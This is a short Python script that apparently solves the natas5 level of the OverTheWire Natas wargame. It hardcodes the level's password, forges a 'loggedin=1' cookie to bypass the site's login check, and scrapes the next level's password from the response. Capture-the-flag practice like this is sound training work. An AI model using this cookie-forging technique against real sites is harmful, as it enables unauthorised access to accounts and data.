import requests as req
import re


username="natas5"
password='0n35PkggAPm2zbEpOU802c0x0Msn1ToK'
cookie={
    "loggedin":"1"
}
url="http://%s.natas.labs.overthewire.org/" % username

response=req.get(url,auth=(username,password),cookies=cookie)

print(re.findall("Access granted. The password for natas6 is (.*)</div>",response.text)[0])


